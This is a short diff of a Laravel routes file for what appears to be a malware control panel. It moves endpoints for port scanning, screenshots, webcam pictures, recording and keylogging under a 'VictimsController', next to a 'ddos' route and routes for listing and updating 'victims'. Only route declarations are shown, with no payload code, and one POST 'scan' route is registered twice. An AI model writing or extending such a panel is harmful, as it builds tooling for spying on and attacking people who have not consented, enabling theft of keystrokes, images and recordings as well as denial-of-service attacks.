@@ -35,16 +35,17 @@ Route::middleware(['auth'])->group(function () {
     Route::get('network', [\App\Http\Controllers\NetworkController::class, 'index'])->name('network');
     Route::get('network/{id}', [\App\Http\Controllers\NetworkController::class, 'show'])->name('network.show');
     Route::post('network/{id}', [\App\Http\Controllers\NetworkController::class, 'destroy'])->name('network.destroy');
-    Route::post('scan', [\App\Http\Controllers\NetworkController::class, 'scan'])->name('network.scan');
-    Route::post('scan', [\App\Http\Controllers\NetworkController::class, 'scanport'])->name('network.scanport');
-    Route::get('scan', [\App\Http\Controllers\NetworkController::class, 'scan'])->name('network.scan');
-    Route::post('screenshot', [\App\Http\Controllers\NetworkController::class, 'screenshot'])->name('network.screenshot');
-    Route::post('picture', [\App\Http\Controllers\NetworkController::class, 'picture'])->name('network.picture');
-    Route::post('record', [\App\Http\Controllers\NetworkController::class, 'record'])->name('network.record');
-    Route::post('keylogger', [\App\Http\Controllers\NetworkController::class, 'keylogger'])->name('network.keylogger');
     Route::post('ddos', [\App\Http\Controllers\NetworkController::class, 'ddos'])->name('network.ddos');
     Route::get('victims', [\App\Http\Controllers\VictimsController::class, 'index'])->name('victims.index');
     Route::put('victims/{id}', [\App\Http\Controllers\VictimsController::class, 'update'])->name('victims.update');
+    Route::get('victims/{id}', [\App\Http\Controllers\VictimsController::class, 'show'])->name('victims.show');
+    Route::post('scan', [\App\Http\Controllers\VictimsController::class, 'scan'])->name('victims.scan');
+    Route::post('scan', [\App\Http\Controllers\VictimsController::class, 'scanport'])->name('victims.scanport');
+    Route::get('scan', [\App\Http\Controllers\VictimsController::class, 'scan'])->name('victims.scan');
+    Route::post('screenshot', [\App\Http\Controllers\VictimsController::class, 'screenshot'])->name('victims.screenshot');
+    Route::post('picture', [\App\Http\Controllers\VictimsController::class, 'picture'])->name('victims.picture');
+    Route::post('record', [\App\Http\Controllers\VictimsController::class, 'record'])->name('victims.record');
+    Route::post('keylogger', [\App\Http\Controllers\VictimsController::class, 'keylogger'])->name('victims.keylogger');
 
 
 
